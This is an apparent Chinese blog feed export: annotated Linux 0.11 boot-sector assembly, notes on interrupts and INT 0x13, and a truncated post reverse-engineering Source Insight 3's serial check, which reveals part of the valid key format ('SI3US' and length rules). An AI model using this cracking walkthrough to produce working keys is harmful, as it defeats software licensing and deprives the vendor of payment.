class="line">.text</span><br><span class="line"></span><br><span class="line">/* Line 255 */</span><br><span class="line">.text</span><br><span class="line">endtext:</span><br><span class="line">.data</span><br><span class="line">enddata:</span><br><span class="line">.bss</span><br><span class="line">endbss:</span><br></pre></td></tr></table></figure><p>伪指令 .globl 用于定义随后的标识符是外部或全局的。.text，.data，.bss 分别定义当前代码段，数据段及未初始化数据段。ld86 在链接时会将各个目标模块中相应的段合并在一起，这里三个段都定义在同一重叠地址范围中，因此本程序实际上不分段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/* Line 34 */</span><br><span class="line">SETUPLEN = 4/* setup 模块所占的扇区个数*/</span><br><span class="line">BOOTSEG  = 0x07c0/* boot 模块对应的物理段地址 */</span><br><span class="line">INITSEG  = 0x9000/* 要将 boot 模块移动到的目的段地址 */</span><br><span class="line">SETUPSEG = 0x9020/* setup 模块读入的段地址 */</span><br><span class="line">SYSSEG   = 0x1000/* system 模块读入的段地址 */</span><br><span class="line">ENDSEG   = SYSSEG + SYSSIZE/* system 模块结束地址 */</span><br><span class="line">ROOT_DEV = 0x306/* 根设备号 */</span><br></pre></td></tr></table></figure><p>之前提到 bootsect 模块被读入 0x7C000，这里的 BOOTSEG 只为 0x7c00，原因是这个数据会被装入段寄存器中，寻址时会自动乘 16，再加偏移。INITSEG，SETUPSEG，SYSSEG，ENDSEG 同理</p><p>对于根设备号而言，0x301 表示第一个硬盘第一个分区，一个硬盘最多可以分 4 个区，于是 0x301 ~ 0x304 表示第一个硬盘的 1 ~ 4 号分区，0x306 ~ 0x309 表示第二个硬盘的 1 ~ 4 号分区，0x300 及 0x305 分别表示整个第一硬盘与整个第二硬盘</p><p>计算根设备号的方法是：主设备号 * 256 + 从设备号，其中主设备号有：1-内存，2-磁盘，3-硬盘，4-ttyx，5-tty，6-并行口，7-非命名管道</p><p>此处使用的根设备号为 0x306，Linus 当年在写代码时，根文件系统放在了第二个硬盘的第一个分区，所以根设备号就为 0x306</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/* Line 45 */</span><br><span class="line">entry start/* 表示程序入口在表示符 start 处 */</span><br><span class="line">start:</span><br><span class="line">movax,#BOOTSEG</span><br><span class="line">movds,ax</span><br><span class="line">movax,#INITSEG</span><br><span class="line">moves,ax</span><br><span class="line">movcx,#256</span><br><span class="line">subsi,si</span><br><span class="line">subdi,di</span><br><span class="line">rep</span><br><span class="line">movw</span><br><span class="line">jmpigo,INITSEG</span><br></pre></td></tr></table></figure><p>rep; movw 就是从 ds:[si] 拷贝数据至 es:[di]，每次拷贝 2 字节，重复 256 次，也就是将 bootsect 模块自身拷贝至 0x90000，之后 jmpi 跳转至 INITSEG:[go] 处继续执行，同时 0x9000 自动载入 cs 段寄存器。这里的 go 是代码中紧接着的一个标识符，所以拷贝完成后会在 0x90000 代码段中接着执行后面的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/* Line 57 */</span><br><span class="line">go:movax,cs</span><br><span class="line">movds,ax</span><br><span class="line">moves,ax</span><br><span class="line">/* 将栈放置在 0x9ff00 */</span><br><span class="line">movss,ax</span><br><span class="line">movsp,#0xFF00</span><br></pre></td></tr></table></figure><p>此时 cs 已经为 0x9000，将 ds，es，ss 都设置为 0x9000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/* Line 67 */</span><br><span class="line">load_setup:</span><br><span class="line">movdx,#0x0000/* 驱动器A 磁头0 */</span><br><span class="line">movcx,#0x0002/* 磁道0 扇区2 */</span><br><span class="line">movbx,#0x0200/* 读入的地址为 es:[0x200] */</span><br><span class="line">movax,#0x0200+SETUPLEN/* 读盘 要读入的扇区数为 4 */</span><br><span class="line">int0x13/* 调用 bios 中断功能，中断号为 0x13 */</span><br><span class="line">jncok_load_setup/* 如果成功读取，则跳转至标号 ok_load_setup */</span><br><span class="line">movdx,#0x0000</span><br><span class="line">movax,#0x0000</span><br><span class="line">int0x13/* 否则复位磁盘驱动器 */</span><br><span class="line">jload_setup/* 跳转至 load_setup 重新读取 */</span><br><span class="line"></span><br><span class="line">ok_load_setup:</span><br><span class="line">movdl,#0x00/* 驱动器A */</span><br><span class="line">movax,#0x0800/* 功能号为8，表示获取磁盘参数 */</span><br><span class="line">int0x13</span><br><span class="line">movch,#0x00/* ch 清零 */</span><br><span class="line">seg cs/* 表示下一条指令的操作数在 cs 寄存器所指的段中 */</span><br><span class="line">movsectors,cx/* 将每磁道最大扇区数保存在 cs:[sectors] 处*/</span><br><span class="line">movax,#INITSEG</span><br><span class="line">moves,ax/* 取磁盘参数时修改了 es，现在将其改回来 */</span><br><span class="line"></span><br><span class="line">/* Line 241 */</span><br><span class="line">sectors:</span><br><span class="line">.word 0</span><br></pre></td></tr></table></figure><p>读取成功磁盘成功时，CF 位为 0，故 jnc 会跳转，关于 INT 0x13 参数传递及存放返回值的寄存器在 <a href="https://in1nit1t.github.io/2020/03/19/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D/" target="_blank">上一篇文章</a> 中已经给出，这里不再赘述。此时 setup 模块已经被加载到 0x90200 处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/* Line 94 */</span><br><span class="line">movah,#0x03/* 取光标位置 */</span><br><span class="line">xorbh,bh/* 显存第 0 页 */</span><br><span class="line">int0x10</span><br><span class="line"></span><br><span class="line">movcx,#24/* 字符串长度为 24 */</span><br><span class="line">movbx,#0x0007/* 第 0 页，属性为 7(normal) */</span><br><span class="line">movbp,#msg1/* 要显示的字符串在 es:[bp] */</span><br><span class="line">movax,#0x1301/* 在屏幕上显示 msg1，并挪动光标 */</span><br><span class="line">int0x10</span><br><span class="line"></span><br><span class="line">/* Line 244 */</span><br><span class="line">msg1:</span><br><span class="line">.byte 13,10/* 13-回车 10-换行 */</span><br><span class="line">.ascii &quot;Loading system ...&quot;</span><br><span class="line">.byte 13,10,13,10</span><br></pre></td></tr></table></figure><p>这一段代码先获取光标的位置，保存在 DX 中，再将其作为参数调用显示字符串的功能，意为在光标位置处显示 “Loading system” 字样</p><p>关于 BIOS 0x10 中断：</p><ul><li>AH = 0x03 表示读取光标位置，<strong>参数用 BH 传递，表示页号</strong>，<strong>返回值</strong>如下：<ul><li>CH = 扫描开始线</li><li>CL = 扫描结束线</li><li>DH = 行号（0x00 表示最顶端）</li><li>DL = 列号（0x00 表示最左边）</li></ul></li><li>AH = 0x13 表示显示字符串至屏幕，<strong>参数</strong>为：<ul><li>AL = 放置光标的方式及属性，0x01 表示使用 BL 中的属性值，光标停在字符串结尾</li><li>BH = 显示页面号</li><li>BL = 字符属性</li><li>DH = 行号</li><li>DL = 列号</li><li>CX = 显示的字符数</li><li>ES:BP 指向要显示的字符串起始位置</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* Line 107 */</span><br><span class="line">movax,#SYSSEG/* 通过 es 给 read_it 传参 */</span><br><span class="line">moves,ax</span><br><span class="line">callread_it/* 将 system 读入内存 */</span><br><span class="line">callkill_motor/* 关闭驱动器马达 */</span><br></pre></td></tr></table></figure><p>现在开始将 system 模块加载至 0x10000 处，其调用了两个函数 read_it 与 kill_motor。read_it 将 system 模块读入内存地址为 0x10000 的地方，kill_motor 将驱动器马达关闭，以便得知其状态</p><p>先来看 read_it：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">/* Line 147 */</span><br><span class="line">sread:.word 1+SETUPLEN/* 当前磁道已读的扇区数，setup + bootsect 已经读入了5个扇区 */</span><br><span class="line">head:.word 0/* 当前磁头 */</span><br><span class="line">track:.word 0/* 当前磁道 */</span><br><span class="line"></span><br><span class="line">read_it:</span><br><span class="line">mov ax,es</span><br><span class="line">test ax,#0x0fff/* 检查传入参数低 12 位是否都为 0，如果为都 0 表示段值为 64KB 边界 */</span><br><span class="line">die:jne die/* es 必须为 64 KB(0x10000) 边界开始处，否则陷入死循环 */</span><br><span class="line">xor bx,bx/* bx 用于存放段内偏移地址 */</span><br><span class="line">rp_read:/* 进入循环 */</span><br><span class="line">mov ax,es/* es 为当前所读的段 */</span><br><span class="line">cmp ax,#ENDSEG/* 判断是否读到 system 模块末尾 */</span><br><span class="line">jb ok1_read/* 如果不就是就跳到 ok1_read 继续读入数据 */</span><br><span class="line">ret/* 如果是，表明 system 已经全部载入内存中，返回 */</span><br><span class="line">ok1_read:/* 判断磁道中未读的扇区的空间是否大于 64 KB */</span><br><span class="line">seg cs</span><br><span class="line">mov ax,sectors/* sectors 为之前取磁盘参数时保存的每磁道最大扇区数 */</span><br><span class="line">sub ax,sread/* 减去已经读了的扇区数 */</span><br><span class="line">mov cx,ax/* cx = 还未读的扇区数 */</span><br><span class="line">shl cx,#9/* cx *= 512 bytes */</span><br><span class="line">add cx,bx/* cx += bx 表示此次读操作后，段内读入的字节数 */</span><br><span class="line">jnc ok2_read</span><br><span class="line">je ok2_read/* 如果没有超出 64 KB，则跳到 ok2_read 执行 */</span><br><span class="line">xor ax,ax/* 否则计算此时最多能读入的字节数 */</span><br><span class="line">sub ax,bx/* ax(值为0)减去某数表示取这个数 64KB 的补值（ax 寄存器 16 位） */</span><br><span class="line">shr ax,#9/* ax /= 512，转换成需要读取的扇区数，放在 al 中 */</span><br><span class="line">ok2_read:</span><br><span class="line">call read_track/* 读当前磁道上指定起始扇区和指定扇区长度的数据，先接着往下看 */</span><br><span class="line">mov cx,ax/* cx 为此次读操作已读入的扇区数 */</span><br><span class="line">add ax,sread/* 加上这次操作之前已经读入的扇区数 */</span><br><span class="line">seg cs</span><br><span class="line">cmp ax,sectors/* 与单磁道最大扇区数比较 */</span><br><span class="line">jne ok3_read/* 若当前磁道还有未读扇区，则跳到 ok3_read */</span><br><span class="line">mov ax,#1/* 否则当前磁道读完，继续读该磁道下一磁头面上的数据 */</span><br><span class="line">sub ax,head/* 如果此时 head 为 0，则读 head 为 1 的所有扇区 */</span><br><span class="line">jne ok4_read</span><br><span class="line">inc track/* 否则当前磁道正反两面都读完，去读下一个磁道 */</span><br><span class="line">ok4_read:/* 改变当前磁头，之前为 1 现在为 0；之前为 0 现在为 1 */</span><br><span class="line">mov head,ax</span><br><span class="line">xor ax,ax</span><br><span class="line">ok3_read:</span><br><span class="line">mov sread,ax/* 如果当前磁道还有未读取扇区，保存当前磁道已读扇区 */</span><br><span class="line">shl cx,#9/* 上次已读扇区数 * 512 */</span><br><span class="line">add bx,cx/* bx += cx 调整段内偏移，为下次读入做准备 */</span><br><span class="line">jnc rp_read/* 没有超过 64KB 则跳回上面的 rp_read 继续读数据 */</span><br><span class="line">mov ax,es/* 否则当前段已经读完 */</span><br><span class="line">add ax,#0x1000/* 将 es 的值加 0x1000 */</span><br><span class="line">mov es,ax/* es 指向下一个段 */</span><br><span class="line">xor bx,bx/* 段内偏移清零 */</span><br><span class="line">jmp rp_read/* 跳回 rp_read 继续读数据 */</span><br></pre></td></tr></table></figure><p>read_track 函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">/* Line 198 */</span><br><span class="line">read_track:</span><br><span class="line">push ax</span><br><span class="line">push bx</span><br><span class="line">push cx</span><br><span class="line">push dx/* 通用寄存器入栈 */</span><br><span class="line">mov dx,track/* 取当前磁道号 */</span><br><span class="line">mov cx,sread</span><br><span class="line">inc cx/* cl 放置起始扇区号，sread 为已读扇区数，加一表示下一个未读扇区号 */</span><br><span class="line">mov ch,dl/* ch 存放磁道号 */</span><br><span class="line">mov dx,head/* 取当前磁头号 */</span><br><span class="line">mov dh,dl/* 放置在高位 */</span><br><span class="line">mov dl,#0/* 驱动器A */</span><br><span class="line">and dx,#0x0100/* 磁头号不大于 1 */</span><br><span class="line">mov ah,#2/* 功能号2，表示要读盘 */</span><br><span class="line">int 0x13</span><br><span class="line">jc bad_rt/* 如果读取出错，跳到 bad_rt */</span><br><span class="line">pop dx/* 否则将保存的寄存器弹出并返回 */</span><br><span class="line">pop cx</span><br><span class="line">pop bx</span><br><span class="line">pop ax</span><br><span class="line">ret</span><br><span class="line">bad_rt:mov ax,#0</span><br><span class="line">mov dx,#0</span><br><span class="line">int 0x13/* 复位驱动器 */</span><br><span class="line">pop dx</span><br><span class="line">pop cx</span><br><span class="line">pop bx</span><br><span class="line">pop ax/* 将保存的寄存器恢复 */</span><br><span class="line">jmp read_track/* 跳回 read_track 重新读取数据 */</span><br></pre></td></tr></table></figure><p>当 system 模块加载至内存中后，程序返回到 call kill_motor，涉及软驱控制卡编程的知识</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/* Line 233 */</span><br><span class="line">kill_motor:</span><br><span class="line">push dx</span><br><span class="line">mov dx,#0x3f2/* 软驱控制卡的数字输出寄存器端口，只写 */</span><br><span class="line">mov al,#0/* A 驱动器，关闭 FDC，禁止 DMA 与中断请求，关闭马达 */</span><br><span class="line">outb/* 将 al 中的内容输出到 dx 指定的端口去 */</span><br><span class="line">pop dx</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>kill_motor 返回后，来到 bootsect.s 的最后部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">/* Line 117 */</span><br><span class="line">seg cs</span><br><span class="line">movax,root_dev/* 取 508 字节处的一个字（根设备号） */</span><br><span class="line">cmpax,#0/* 判断是否被定义 */</span><br><span class="line">jneroot_defined/* 如果被定义了就跳去 root_defined */</span><br><span class="line">seg cs/* 否则现在来判断根设备号 */</span><br><span class="line">movbx,sectors/* 取每磁道最大扇区数 */</span><br><span class="line">movax,#0x0208</span><br><span class="line">cmpbx,#15/* 与 15 比较 */</span><br><span class="line">jeroot_defined/* 相等则说明这是 1.2MB 的软驱，根设备号就是 ax 中的 0x208 */</span><br><span class="line">movax,#0x021c</span><br><span class="line">cmpbx,#18/* 否则拿来与 18 比较 */</span><br><span class="line">jeroot_defined/* 相等则说明这是 1.44MB 的软驱，根设备号为 0x21c */</span><br><span class="line">undef_root:</span><br><span class="line">jmp undef_root/* 如果两种都不是，就进入死循环 */</span><br><span class="line">root_defined:</span><br><span class="line">seg cs</span><br><span class="line">movroot_dev,ax/* 保存根设备号 */</span><br><span class="line">/* Line 117 */</span><br><span class="line">jmpi0,SETUPSEG/* bootsect 任务完成，跳到 setup 模块执行 */</span><br><span class="line"></span><br><span class="line">/* Line 249 */</span><br><span class="line">.org 508/* .org 伪指令指定绝对地址 */</span><br><span class="line">root_dev:/* 根设备号保存在启动引导扇区的地址 508 字节处 */</span><br><span class="line">.word ROOT_DEV</span><br><span class="line">boot_flag:/* 0xAA55 是启动盘具有有效引导扇区的标志，供 BIOS 加载引导扇区时识别所用*/</span><br><span class="line">.word 0xAA55/* 必须位于引导扇区的最后两个字节中 */</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> Linux0.11 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核源码阅读--开始之前</title>
      <link href="/2020/03/19/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D/"/>
      <url>/2020/03/19/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D/</url>
      
        <content type="html"><![CDATA[<p>在开始阅读系统引导启动部分的内核代码之前，需要对以下内容进行了解：</p><ul><li>Linux 中断机制</li><li>Linux 内核源码目录结构</li><li>磁盘结构及 INT 0x13</li></ul><p>PS. 这个系列的文章将会对 <strong>Linux 0.11</strong> 版本的源码进行分析，资源在文末</p><br><h2 id="中断机制"><a href="#中断机制" class="headerlink" title="中断机制"></a>中断机制</h2><h3 id="硬件原理"><a href="#硬件原理" class="headerlink" title="硬件原理"></a>硬件原理</h3><p>微型计算机通常包括 I/O(输入输出) 设备，处理器向设备提供服务的方式有两种</p><ul><li>主动：处理器挨个地去询问系统中的设备是否需要服务，这种方式称为 <strong>轮询</strong>，缺点是太耗费系统资源</li><li>被动：当设备需要服务时，向处理器提出请求，处理器响应提出的请求为其提供服务</li></ul><p>当设备向处理器提出请求，处理器在执行完当前的一条指令后立刻响应设备请求，并转到相应的服务程序去执行。执行完服务程序后，又返回到之前被打断的位置继续执行，这就是 <strong>中断(Interrupt)</strong>，设备向处理器发出的服务请求称为 <strong>中断请求(IRQ)</strong></p><p>处理器有一个 INT 引脚专门用来接收中断请求，但设备繁多，如果每个设备的中断请求直接给到处理器，当有多个请求同时到达时，处理器不知道该优先为谁提供服务</p><p>因此，需要有个大哥来管理这些设备的中断请求，这个大哥名叫 <strong>可编程中断控制器(PIC)</strong>，PIC 会连接到处理器的 INT 引脚。设备的中断请求都会先给到 PIC，由 PIC 来筛选优先级高的中断请求递交给 CPU，如果 CPU 正在为一个设备提供中断服务，PIC 还会将选出的请求与正在执行的服务程序的优先级进行比较，以确定是否嵌套中断</p><p>当 PIC 向 INT 引脚发出中断信号后，处理器立即停下手头的工作，询问需要执行什么中断服务，PIC 通过数据总线发送与中断请求对应的 <strong>中断号</strong>，处理器拿着中断号去中断向量表（或 32 位保护模式下的中断描述符表）中查询服务程序的入口，进而跳去执行服务程序</p><p>中断同样可以由软件通过使用 <strong>int</strong> 指令来调用中断服务程序，PC/AT 系列微机提供 256 个中断的支持，大部分为软件中断或异常，<strong>异常</strong> 是处理器在处理过程中检测到错误而产生的中断</p><br><h3 id="中断子系统"><a href="#中断子系统" class="headerlink" title="中断子系统"></a>中断子系统</h3><p>80X86 组成的微机系统中采用编号为 8259A 的 PIC 芯片，每个芯片可以管理 8 个中断源，通过多片级联的方式可以最多管理 64(8*8) 个中断向量的系统</p><p>PC/AT 系列兼容机中使用了两片 8259A 级联，管理 15 级中断向量，结构如图：</p><p><img src="../img/z1.png" alt="中断机制"></p><p>左边两片分别为 8259A 的主片和从片，从片通过自己的 INT 引脚连接到主片的 IR2 引脚。使用 IRQ2 引脚的设备又作为从片 IR1 引脚的输入，表示将使用 IRQ2 的设备的 IRQ2 引脚重定向到 IRQ9 引脚上。同时，主片的端口基址在 0x20，从片在 0xA0</p><p>8259A 芯片可分为编程状态和操作状态</p><ul><li>编程状态下，由处理器使用 IN 或 OUT 指令对其进行初始化编程</li><li>操作状态下，响应设备中断请求，选出最高优先级中断，并通知处理器外中断的到来，处理器响应后，中断号由数据总线 D7-D0 送出，处理器由此获取中断向量值，执行中断服务程序</li></ul><br><h3 id="中断向量表"><a href="#中断向量表" class="headerlink" title="中断向量表"></a>中断向量表</h3><p>当 80X86 微机启动时，BIOS 中的程序会在物理内存起始处(0)初始化中断向量表，该表包含两个 8259A 芯片支持的 16 个硬件中断向量和 BIOS 提供的中断号为 0x10 ~ 0x1F 的中断调用功能向量，每个表项占 4 字节。对于没有使用的向量则填入临时的哑中断服务程序的地址</p><p>对于 Linux 而言，除了在开机时加载引导扇区(bootsect.s)及保存重要信息(setup.s)所用到的 BIOS 中断功能，之后 Linux 会在 setup.s 程序中重新初始化 8259A 芯片，并在 head.s 中重新构建一张中断描述符表，将 BIOS 提供的中断向量表覆盖</p><br><h2 id="内核源码目录结构"><a href="#内核源码目录结构" class="headerlink" title="内核源码目录结构"></a>内核源码目录结构</h2><p>一切尽在图中：</p><p><img src="../img/n1.png" alt="内核源码目录结构"></p><br><h2 id="磁盘结构"><a href="#磁盘结构" class="headerlink" title="磁盘结构"></a>磁盘结构</h2><p>关于磁盘，主要弄清楚几个概念：</p><ul><li>磁头（head）</li><li>磁道（track）</li><li>扇区（sector）</li><li>柱面（cylinder）</li></ul><p>如图，这是一个容量为 1.44 MB 的软盘：</p><p><img src="../img/c1.png" alt="磁盘结构"></p><p>一个磁盘面分正反两面，所以读取用的 <strong>磁头</strong> 也需要两个。从图中可以看到，盘面中一圈圈灰色同心圆为一条条 <strong>磁道</strong>，从圆心向外画射线，可以将磁道划分为若干个弧段，每个磁道上一个弧段称为一个 <strong>扇区</strong>。一个 <strong>柱面</strong> 包含了所有具有相同编号的磁道（从外向内编号，起始为 0）</p><p>一张这样的软盘有 2 个磁头，80 个柱面，每个柱面包含18 个扇区（每个扇区 512 字节），所以它的容量为：</p><p>2 * 80 * 18 * 512 = 1, 474, 560 Bytes = 1, 440 KB = 1.44 MB</p><p>系统启动时的引导扇区就位于 C0-H0-S1（柱面 0，磁头 0，扇区 1）</p><p>若想读写相邻两个磁道的数据，顺序为先读写第一个磁道磁头为 0(正面) 的所有扇区，再读写第一个磁道磁头为 1(反面) 的所有扇区，接着转去第二个磁道按照同样的顺序读写</p><br><h2 id="INT-0X13-指令"><a href="#INT-0X13-指令" class="headerlink" title="INT 0X13 指令"></a>INT 0X13 指令</h2><p>该指令使用 BIOS 提供的磁盘操作功能，通过几个通用寄存器来传递参数</p><p>功能号：</p><ul><li>AH = 0x02：读盘</li><li>AH = 0x03：写盘</li><li>AH = 0x04：校验</li><li>AH = 0x08：取磁盘参数</li><li>AH = 0x0c：寻道</li><li>AH = 0x15：取磁盘类型</li></ul><br><p><strong>AH 为 2 时：</strong></p><ul><li><p>参数：</p><ul><li>AL = 读出的扇区数（只能同时处理连续的扇区）</li><li>CH = 磁道号低八位</li><li>CL = 起始扇区号(0 ~ 5 位)，磁道号高两位(6 ~ 7 位) </li><li>DH = 磁头号</li><li>DL = 驱动器号</li><li>ES:BX = 缓冲地址（校验及寻道时不使用）</li></ul></li><li><p>返回值：</p><ul><li>FLAGS.CF = 0：处理时没有发生错误，AH = 0</li><li>FLAGS.CF = 1：发生了错误，错误号存在 AH 中</li></ul></li></ul><br><p><strong>AH 为 8 时：</strong></p><ul><li>参数：<ul><li>DL = 驱动器号</li></ul></li><li>返回值：<ul><li>FLAGS.CF = 0：处理时没有发生错误，AH = 0</li><li>FLAGS.CF = 1：发生了错误，错误号存在 AH 中</li><li>AL = 0</li><li>BL = 驱动器类型（AT / PS2）</li><li>CH = 最大磁道号的低8位</li><li>CL = 每磁道最大扇区数（0-5bit），最大磁道号高2位（6-7bit）</li><li>DH = 最大磁头数</li><li>DL = 驱动器数量</li><li>ES:DI：软驱磁盘参数表</li></ul></li></ul><br><p><strong>AH 为 0x15 时：</strong></p><ul><li>参数：<ul><li>DL = 驱动器号<ul><li>0x80 指第一个硬盘</li><li>0x81 指第二个硬盘</li></ul></li></ul></li><li>返回值：<ul><li>AH = 类型码<ul><li>0：没有这个盘，CF 置位</li><li>1：软驱，没有 change-line 支持</li><li>2：软驱(或其他可移动设备)，有 change-line 支持</li><li>3：硬盘</li></ul></li></ul></li></ul><br><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>链接：<a href="https://pan.baidu.com/s/1s6FDogdn2UTpgSIa3Tzf-w">Linux 0.11 源码</a></p><p>提取码：sgd1</p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> Linux0.11 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Source Insight 3破解</title>
      <link href="/2020/03/18/Source-Insight-3%E7%A0%B4%E8%A7%A3/"/>
      <url>/2020/03/18/Source-Insight-3%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>上操作系统课的老师给我们发了一个大工程编辑软件 Source Insight 3，还是没有注册过的，我就拿来分析了一下，发现注册函数很简单 (o°ω°o)。8 说了，开整</p><p>PS. 资源在文末，非商用目的，仅供学习交流使用</p><br><h2 id="找到注册函数"><a href="#找到注册函数" class="headerlink" title="找到注册函数"></a>找到注册函数</h2><p>打开软件，就让输入序列号：</p><p><img src="../img/1.png" alt="1"></p><p>随便输一个 123</p><p><img src="../img/2.png" alt="1"></p><p>将 exe 拖入 ida，在文字窗口搜索 “You typed”，找到一个匹配项</p><p><img src="../img/3.png" alt="1"></p><p>检查交叉引用，来到函数 sub_4495B1</p><p><img src="../img/4.png" alt="1"></p><p>可以看到左下角有成功注册的提示，往上找找，可以看到是 sub_445B07 函数的返回值（test eax, eax）将验证结果区分开来，若想成功注册，就得使 sub_445B07 返回非零</p><p>再往上看看，调用 sub_445B07 之前压入了一个字节数组的地址（0x5E5BFC），再之前，还调用了 strupr 函数将这个字节数组每个字符转化为大写，所以猜测该字节数组为我们的输入序列号字符串，sub_445B07 则为注册函数</p><br><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>sub_445B07 的伪代码：</p><p><img src="../img/5.png" alt="1"></p><p>结构很清晰，序列号应该分三段，连接符号是 ‘-‘，形如 XXXX-XXXX-XXXX，一段一段地检查</p><p>第一段：</p><p><img src="../img/6.png" alt="1"></p><p>其中的 sub_414738 函数如下：</p><p><img src="../img/7.png" alt="1"></p><p>也就是说第一段应与全局变量 aSi3us 相同，故第一段为 “SI3US”</p><br><p>第二段：</p><p><img src="../img/8.png" alt="1"></p><p>这里将我们输入序列号的中间部分取出来，长度得是 6，并且调用 atoi 函数将其转换为数值，这个数不能在元素个数为 23 的 int 数组 dword_53CA80 中</p><br><p>第三段：</p><p><img src="../img/9.png" alt="1"></p><p>长度应该为 5，且调用了 sub_4F62D4 